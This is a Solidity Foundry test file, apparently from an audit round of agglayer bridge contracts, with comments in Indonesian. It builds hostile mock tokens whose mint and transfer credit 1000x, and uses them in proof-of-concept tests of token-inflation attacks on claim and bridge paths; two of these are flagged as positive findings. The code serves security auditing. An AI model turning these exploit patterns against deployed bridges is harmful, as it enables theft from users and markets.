// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.28;

// PoC audit ronde 10 worker B - penutup keluarga R8-F
// (agglayer-contracts @ 110bda5a, HEAD tidak bergerak vs r8/r9).
//
// Tugas:
//  (1) Enumerasi SEMUA pemanggil _bridgeWrappedAsset: hanya 4 situs di
//      seluruh src/ (grep): bridgeAsset cabang WETH (AgglayerBridge:332,
//      R9-WETH), bridgeAsset cabang wrapped (AgglayerBridge:351, R8-F),
//      bridgeMessageWETH (AgglayerBridge:461, V1c), migrateLegacyToken
//      (AgglayerBridgeL2:630, V5a). ExtensionAgglayerBridgeL2 hanya
//      override keempatnya menjadi revert (initializer-only). Periphery
//      (ClaimCompressor, BatchL2DataCreatedRollup) tidak memanggilnya dan
//      tidak punya op token. -> TIDAK ADA pemanggil belum di-cover.
//  (2) Jalur balance-checked LAIN yang bisa dikalahkan token pembohong:
//      cabang lokal bridgeAsset (balanceBefore/After), jalur klaim
//      (_claimWrappedAsset mint / transfer), bridgeMessage.
//  (3) V5a lebih dalam: apakah R2 hasil free-mint punya jalur exit
//      sendiri (bridgeAsset / bridgeMessage / unmap -> cabang lokal)?
//  (4) Penulis wrappedTokenToTokenInfo / sovereign mapping selain yang
//      sudah diaudit: deployWrappedTokenAndRemap (onlyBridgeManager) -
//      memetakan HANYA token bridge-deployed (honest). Diuji di sini.
//
// Harness: mewarisi AgglayerR9VariantsTest (setUp + helper + mock sama).

import "forge-std/Test.sol";
import {AgglayerBridge} from "../src/AgglayerBridge.sol";
import {AgglayerBridgeL2} from "../src/sovereignChains/AgglayerBridgeL2.sol";
import {MerkleHelper} from "./AgglayerR1.t.sol";
import {MockUSDC, FakeBurnToken, MockGERL2GER} from "./AgglayerR8GER.t.sol";
import {
    MockERC20Full,
    FakeTransferToken,
    AgglayerR9VariantsTest
} from "./AgglayerR9Variants.t.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Token yang mint-nya BERBOHONG: mencetak amount*1000 ke penerima.
/// transfer/transferFrom/burn jujur. Dipakai untuk menguji jalur klaim
/// (_claimWrappedAsset -> mint) terhadap token yang memalsukan mint.
contract LyingMintToken {
    string public name = "LyingMint";
    string public symbol = "LMINT";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount * 1000;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "no allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(address account, uint256 amount) external {
        require(balanceOf[account] >= amount, "insufficient");
        balanceOf[account] -= amount;
    }
}

/// @notice Token yang transfer-nya BERBOHONG: mengkredit penerima
/// amount*1000 tanpa pernah mendebit pengirim. Dipakai untuk menguji jalur
/// klaim isNotMintable=true (_claimWrappedAsset -> safeTransfer).
contract LyingTransferToken2 {
    string public name = "LyingTransfer";
    string public symbol = "LTRAN";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[to] += amount * 1000;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "no allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(address account, uint256 amount) external {
        require(balanceOf[account] >= amount, "insufficient");
        balanceOf[account] -= amount;
    }
}

contract AgglayerR10CloseoutTest is AgglayerR9VariantsTest {
    /// @notice Setup V5a: victim import 1000 USDC, manager map fake lalu
    /// openMint (R2) ke (0,USDC), attacker migrate 1.000.000 R2 gratis.
    function _setupV5aFreeMint() internal {
        _importUsdcToS(1000e6, victim);
        uint32[] memory nets = new uint32[](1);
        nets[0] = 0;
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        address[] memory sovs = new address[](1);
        sovs[0] = address(fakeToken);
        bool[] memory notMint = new bool[](1);
        notMint[0] = false;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);
        sovs[0] = address(openMint);
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);
        vm.prank(attacker);
        bridgeL2.migrateLegacyToken(address(fakeToken), 1_000_000e6, "");
        assertEq(
            openMint.balanceOf(attacker),
            1_000_000e6,
            "setup V5a: attacker harus pegang 1.000.000 R2"
        );
    }

    function _mapTokenOnS(
        address token,
        bool isNotMintable
    ) internal {
        uint32[] memory nets = new uint32[](1);
        nets[0] = 0;
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        address[] memory sovs = new address[](1);
        sovs[0] = token;
        bool[] memory notMint = new bool[](1);
        notMint[0] = isNotMintable;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);
    }

    // ============ (4) deployWrappedTokenAndRemap ============
    // Penulis mapping yang belum diaudit r9: hanya memetakan token yang
    // BARU di-deploy bridge sendiri (TokenWrapped honest). Buktikan:
    // token hasil remap tidak bisa di-bridge tanpa saldo (burn jujur),
    // migrasi legacy -> baru 1:1, legacy tetap bisa exit langsung.

    function test_R10T4_deployWrappedTokenAndRemapOnlyMapsHonestToken() public {
        // (1) Map legacy openMint (R2) -> (0,USDC), victim import 1000.
        _mapTokenOnS(address(openMint), false);
        _importUsdcToS(1000e6, victim);
        assertEq(
            openMint.balanceOf(victim),
            1000e6,
            "T4: victim pegang 1000 R2 legacy"
        );

        // (2) Manager upgrade: deploy proxy baru + remap.
        vm.prank(managerAddr);
        bridgeL2.deployWrappedTokenAndRemap(0, address(usdc), false);
        address newProxy = bridgeL2.getTokenWrappedAddress(0, address(usdc));
        assertTrue(newProxy != address(0), "T4: proxy baru harus ada");
        assertTrue(
            newProxy != address(openMint),
            "T4: proxy baru harus beda dari legacy"
        );
        (uint32 oNet, address oTok) = bridgeL2.wrappedTokenToTokenInfo(newProxy);
        assertEq(oNet, 0, "T4: proxy baru originNetwork 0");
        assertEq(oTok, address(usdc), "T4: proxy baru origin USDC");

        // (3) Penyerang (0 proxy baru) bridge -> HARUS revert (burn jujur).
        bool okAttack = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1000e6,
            newProxy
        );
        assertFalse(okAttack, "T4: bridge proxy baru tanpa saldo HARUS revert");

        // (4) Legacy tetap bisa exit langsung (docs: user selalu bisa withdraw).
        bytes memory md = abi.encode("Real2", "R2", uint8(6));
        bool okLegacy = _bridgeAssetRaw(
            address(bridgeL2),
            victim,
            0,
            victim,
            400e6,
            address(openMint)
        );
        assertTrue(okLegacy, "T4: bridge legacy langsung HARUS sukses");
        _pushSLeaf(0, 0, address(usdc), 0, victim, 400e6, md);

        // (5) Migrasi sisa 600 legacy -> baru 1:1, lalu bridge keluar.
        vm.prank(victim);
        bridgeL2.migrateLegacyToken(address(openMint), 600e6, "");
        assertEq(
            _wbal(newProxy, victim),
            600e6,
            "T4: migrasi legacy->baru harus 1:1"
        );
        bool okNew = _bridgeAssetRaw(
            address(bridgeL2),
            victim,
            0,
            victim,
            600e6,
            newProxy
        );
        assertTrue(okNew, "T4: bridge proxy baru HARUS sukses");
        _pushSLeaf(0, 0, address(usdc), 0, victim, 600e6, md);
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            0,
            "T4: LBT terkuras 400+600"
        );

        // (6) Panggilan kedua HARUS revert (create2 salt sama sudah terpakai).
        vm.prank(managerAddr);
        (bool okSecond, ) = address(bridgeL2).call(
            abi.encodeCall(
                AgglayerBridgeL2.deployWrappedTokenAndRemap,
                (uint32(0), address(usdc), false)
            )
        );
        assertFalse(okSecond, "T4: remap kedua HARUS revert (create2 collision)");
        emit log("T4: deployWrappedTokenAndRemap hanya memetakan token honest bridge-deployed; bukan jalur token pembohong");
    }

    // ============ (4b) cabang WETH deployWrappedTokenAndRemap ============
    // Di chain G, WETH sudah di-deploy bridge saat init dengan salt 0, jadi
    // upgrade WETH via fungsi ini HARUS revert (create2 collision) - jalur
    // upgrade WETH yang aman praktis mati; satu-satunya rute ganti WETH
    // adalah setSovereignWETHAddress token arbitrer (akar R9-WETH).

    function test_R10T4b_deployWrappedTokenAndRemapWethDeadPath() public {
        _importEthToG(5 ether, victim);
        address wethBefore = address(bridgeL2Gas.WETHToken());
        assertTrue(wethBefore != address(0), "T4b: G punya WETH");

        // Map legacy WETH dulu (syarat fungsi: token sudah ter-map).
        MockERC20Full legacyWeth = new MockERC20Full("LegacyWETH", "LWETH", 18);
        vm.prank(managerAddr);
        bridgeL2Gas.setSovereignWETHAddress(address(legacyWeth), false);
        assertEq(
            address(bridgeL2Gas.WETHToken()),
            address(legacyWeth),
            "T4b: WETH kini legacy"
        );

        // Upgrade WETH -> HARUS revert (salt 0 sudah dipakai init).
        vm.prank(managerAddr);
        (bool ok, ) = address(bridgeL2Gas).call(
            abi.encodeCall(
                AgglayerBridgeL2.deployWrappedTokenAndRemap,
                (uint32(0), address(0), false)
            )
        );
        assertFalse(ok, "T4b: upgrade WETH HARUS revert (salt 0 collision)");
        assertEq(
            address(bridgeL2Gas.WETHToken()),
            address(legacyWeth),
            "T4b: WETH tidak berubah"
        );
        emit log("T4b: deployWrappedTokenAndRemap WETH mati bila WETH init bridge-deployed; rute ganti WETH hanya setSovereignWETHAddress (R9-WETH)");
    }

    // ============ (2a) lying MINT di jalur klaim (mintable) ============
    // claimAsset atas leaf (0,USDC) memanggil token.mint(dest, amount)
    // tanpa verifikasi. Token pembohong mencetak 1000x ke penerima dari
    // SATU leaf 1 USDC yang sah. LBT tidak ikut membengkak (tetap 1 USDC),
    // tapi 1.000.000 "wrapped USDC" kini beredar di S tanpa backing.

    function test_R10T2a_lyingMintOnClaimInflatesCanonicalWrapped() public {
        LyingMintToken lyingMint = new LyingMintToken();
        _mapTokenOnS(address(lyingMint), false);

        // Penyerang import 1000 USDC sah -> klaim mencetak 1000x.
        _importUsdcToS(1000e6, attacker);
        assertEq(
            lyingMint.balanceOf(attacker),
            1_000_000e6,
            "T2a: klaim 1000 USDC mencetak 1.000.000 LMINT"
        );
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            1000e6,
            "T2a: LBT tetap 1000 USDC (mint lie tidak sentuh LBT)"
        );

        // Exit via bridge tetap di-gate LBT: 2000 USDC revert, 1000 sukses.
        bool okTooMuch = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            2000e6,
            address(lyingMint)
        );
        assertFalse(okTooMuch, "T2a: bridge 2000 USDC HARUS revert (LBT 1000)");
        bytes memory md = abi.encode("LyingMint", "LMINT", uint8(6));
        bool okOne = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1000e6,
            address(lyingMint)
        );
        assertTrue(okOne, "T2a: bridge 1000 USDC HARUS sukses");
        _pushSLeaf(0, 0, address(usdc), 0, attacker, 1000e6, md);
        assertTrue(
            _claimAssetMainnetFromS(0, 0, address(usdc), attacker, 1000e6, md),
            "T2a: klaim mainnet 1000 USDC HARUS sukses"
        );
        assertEq(usdc.balanceOf(attacker), 1000e6, "T2a: penyerang +1000 USDC riil");
        assertEq(
            lyingMint.balanceOf(attacker),
            999_000e6,
            "T2a: 999.000 LMINT tanpa backing tersisa di S"
        );
        emit log("T2a: POSITIF (keluarga R8-F) - lying mint di claimAsset mencetak wrapped kanonik 1000x dari 1 leaf sah; exit bridge tetap LBT-gated, kerusakan di pasar S");
    }

    // ============ (2b) lying TRANSFER di jalur klaim (isNotMintable) ============
    // _claimWrappedAsset cabang isNotMintable memanggil safeTransfer tanpa
    // cek saldo bridge. Token pembohong mengkredit 1000x tanpa pernah
    // dipegang bridge.

    function test_R10T2b_lyingTransferOnClaimIsNotMintable() public {
        LyingTransferToken2 lyingT2 = new LyingTransferToken2();
        _mapTokenOnS(address(lyingT2), true);

        _importUsdcToS(1000e6, attacker);
        assertEq(
            lyingT2.balanceOf(attacker),
            1_000_000e6,
            "T2b: klaim 1000 USDC mencetak 1.000.000 LTRAN via transfer bohong"
        );
        assertEq(
            lyingT2.balanceOf(address(bridgeL2)),
            0,
            "T2b: bridge TIDAK PERNAH memegang token itu"
        );
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            1000e6,
            "T2b: LBT tetap 1000 USDC"
        );
        emit log("T2b: POSITIF (keluarga R8-F) - lying transfer di claimAsset isNotMintable mencetak wrapped kanonik 1000x; bridge tidak memegang token sama sekali");
    }

    // ============ (2c) cabang LOKAL bridgeAsset: lying transferFrom ============
    // Token tak ter-map masuk cabang lokal: leafAmount = balanceAfter -
    // balanceBefore. Token pembohong mengkredit bridge tanpa mendebit
    // siapa pun -> leaf 1000 LYING dari NOL. Tapi origin leaf adalah
    // (S, LYING) sendiri: klaim di mainnet hanya mencetak wrapped LYING
    // (tak berharga), dan round-trip kembali ke S hanya mengembalikan
    // LYING itu sendiri. Inflasi leaf TERBUKTI, ekstraksi nilai NOL.

    function test_R10T2c_localBranchLyingTransferFromNoValueExtraction() public {
        // Penyerang bridge token lokal pembohong (0 LYING) -> leaf 1000.
        bool ok = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1000e18,
            address(lyingToken)
        );
        assertTrue(ok, "T2c: bridge lokal LYING HARUS sukses (leaf dibuat)");
        assertEq(
            lyingToken.balanceOf(address(bridgeL2)),
            1000e18,
            "T2c: bridge dikredit 1000 LYING dari NOL"
        );
        assertEq(
            lyingToken.balanceOf(attacker),
            0,
            "T2c: penyerang tetap 0 LYING (tidak pernah didebit)"
        );
        bytes memory md = abi.encode("Lying", "LYING", uint8(18));
        _pushSLeaf(0, 2, address(lyingToken), 0, attacker, 1000e18, md);

        // Klaim di mainnet -> hanya wrapped LYING, bukan USDC/ETH.
        assertTrue(
            _claimAssetMainnetFromS(0, 2, address(lyingToken), attacker, 1000e18, md),
            "T2c: klaim mainnet HARUS sukses"
        );
        address wrappedLying = bridgeMain.getTokenWrappedAddress(
            2,
            address(lyingToken)
        );
        assertTrue(wrappedLying != address(0), "T2c: wrapped LYING ter-deploy");
        assertEq(
            MockERC20Full(wrappedLying).balanceOf(attacker),
            1000e18,
            "T2c: penyerang pegang 1000 wrapped LYING"
        );
        assertEq(usdc.balanceOf(attacker), 0, "T2c: penyerang 0 USDC");
        assertEq(
            usdc.balanceOf(address(bridgeMain)),
            5_000_000e6,
            "T2c: USDC bridge mainnet utuh"
        );

        // Round-trip: bridge wrapped LYING kembali -> klaim di S -> LYING.
        vm.prank(attacker);
        MockERC20Full(wrappedLying).approve(address(bridgeMain), 1000e18);
        bool okBack = _bridgeAssetRaw(
            address(bridgeMain),
            attacker,
            2,
            attacker,
            1000e18,
            wrappedLying
        );
        assertTrue(okBack, "T2c: bridge wrapped LYING kembali HARUS sukses");
        bytes32 leafBack = _leaf(
            0,
            2,
            address(lyingToken),
            2,
            attacker,
            1000e18,
            md
        );
        bytes32[] memory one = new bytes32[](1);
        one[0] = leafBack;
        bytes32 mRoot = MerkleHelper.treeRoot(one);
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(one, 0);
        bytes32[32] memory emptyProof;
        vm.prank(attacker);
        bridgeL2.claimAsset(
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            mRoot,
            bytes32(0),
            2,
            address(lyingToken),
            2,
            attacker,
            1000e18,
            md
        );
        assertEq(
            lyingToken.balanceOf(attacker),
            1000e18,
            "T2c: penyerang akhir pegang 1000 LYING (tak berharga)"
        );
        assertEq(usdc.balanceOf(attacker), 0, "T2c: akhir tetap 0 USDC");
        emit log("T2c: NEGATIF utk pencurian - leaf lokal membengkak 1000x tapi origin (S,LYING) self-contained; tidak ada ekstraksi nilai mainnet");
    }

    // ============ (3a) V5a: R2 free-mint TIDAK bisa exit via bridgeAsset ============
    // Bridge 1.000.000 R2 revert (LBT hanya 1000); hanya 1000 yang keluar.

    function test_R10T3a_freeMintedR2CannotExitBeyondLbt() public {
        _setupV5aFreeMint();
        bool okAll = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1_000_000e6,
            address(openMint)
        );
        assertFalse(okAll, "T3a: bridge 1.000.000 R2 HARUS revert (LBT 1000)");
        bool okOver = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1001e6,
            address(openMint)
        );
        assertFalse(okOver, "T3a: bridge 1001 R2 HARUS revert");
        bytes memory md = abi.encode("Real2", "R2", uint8(6));
        bool okCap = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1000e6,
            address(openMint)
        );
        assertTrue(okCap, "T3a: bridge 1000 R2 HARUS sukses (cap LBT)");
        _pushSLeaf(0, 0, address(usdc), 0, attacker, 1000e6, md);
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            0,
            "T3a: LBT 0 setelah exit 1000"
        );
        assertEq(
            openMint.balanceOf(attacker),
            999_000e6,
            "T3a: 999.000 R2 tersisa di S, tidak bisa keluar via bridge"
        );
        emit log("T3a: NEGATIF - R2 free-mint TIDAK punya jalur exit bridge sendiri; exit tetap di-gate LBT (1000 dari 1.000.000)");
    }

    // ============ (3b) V5a: R2 TIDAK bisa exit via jalur message ============
    // S ether-native: bridgeMessageWETH revert (NativeTokenIsEther);
    // bridgeMessage bernilai revert (LBT (0,0) = 0, tidak ada ETH import).

    function test_R10T3b_freeMintedR2CannotExitViaMessage() public {
        _setupV5aFreeMint();
        vm.prank(attacker);
        (bool okWeth, ) = address(bridgeL2).call(
            abi.encodeCall(
                AgglayerBridge.bridgeMessageWETH,
                (uint32(0), attacker, 1000e6, false, "")
            )
        );
        assertFalse(okWeth, "T3b: bridgeMessageWETH di S HARUS revert");
        vm.prank(attacker);
        (bool okMsg, ) = address(bridgeL2).call{value: 1 ether}(
            abi.encodeCall(
                AgglayerBridge.bridgeMessage,
                (uint32(0), attacker, false, "")
            )
        );
        assertFalse(okMsg, "T3b: bridgeMessage 1 ETH HARUS revert (LBT (0,0)=0)");
        assertEq(
            openMint.balanceOf(attacker),
            1_000_000e6,
            "T3b: R2 tetap 1.000.000, tidak ada yang keluar"
        );
        emit log("T3b: NEGATIF - tidak ada jalur message untuk R2 free-mint");
    }

    // ============ (3c) V5a: unmap R2 -> cabang lokal, tetap tanpa nilai ============
    // Manager map R3 sebagai current lalu remove legacy R2: R2 jadi token
    // lokal. Bridge 1.000.000 R2 jujur -> leaf origin (S, R2) -> klaim di
    // mainnet hanya mencetak wrapped R2 (tak berharga). USDC utuh.

    function test_R10T3c_unmappedR2LocalBranchExitYieldsNoMainnetValue() public {
        _setupV5aFreeMint();
        MockERC20Full tokenR3 = new MockERC20Full("Real3", "R3", 6);
        _mapTokenOnS(address(tokenR3), false);
        vm.prank(managerAddr);
        bridgeL2.removeLegacySovereignTokenAddress(address(openMint));
        (uint32 oNet, address oTok) = bridgeL2.wrappedTokenToTokenInfo(
            address(openMint)
        );
        assertEq(oNet, 0, "T3c: R2 terhapus dari mapping (originNetwork 0)");
        assertEq(oTok, address(0), "T3c: R2 terhapus dari mapping (origin 0)");
        assertEq(
            bridgeL2.getTokenWrappedAddress(0, address(usdc)),
            address(tokenR3),
            "T3c: current kini R3"
        );

        // Bridge 1.000.000 R2 sebagai token lokal (transfer jujur).
        vm.prank(attacker);
        openMint.approve(address(bridgeL2), 1_000_000e6);
        bool ok = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1_000_000e6,
            address(openMint)
        );
        assertTrue(ok, "T3c: bridge lokal 1.000.000 R2 HARUS sukses");
        assertEq(
            openMint.balanceOf(address(bridgeL2)),
            1_000_000e6,
            "T3c: bridge pegang 1.000.000 R2"
        );
        bytes memory md = abi.encode("Real2", "R2", uint8(6));
        _pushSLeaf(0, 2, address(openMint), 0, attacker, 1_000_000e6, md);
        assertTrue(
            _claimAssetMainnetFromS(
                0,
                2,
                address(openMint),
                attacker,
                1_000_000e6,
                md
            ),
            "T3c: klaim mainnet HARUS sukses"
        );
        address wrappedR2 = bridgeMain.getTokenWrappedAddress(
            2,
            address(openMint)
        );
        assertEq(
            MockERC20Full(wrappedR2).balanceOf(attacker),
            1_000_000e6,
            "T3c: penyerang pegang 1.000.000 wrapped R2"
        );
        assertEq(usdc.balanceOf(attacker), 0, "T3c: penyerang 0 USDC");
        assertEq(
            usdc.balanceOf(address(bridgeMain)),
            5_000_000e6,
            "T3c: USDC bridge mainnet utuh"
        );
        emit log("T3c: NEGATIF - unmap R2 lalu exit lokal hanya mencetak wrapped R2 tak berharga; tidak ada jalur exit mandiri ke USDC/ETH mainnet");
    }
}
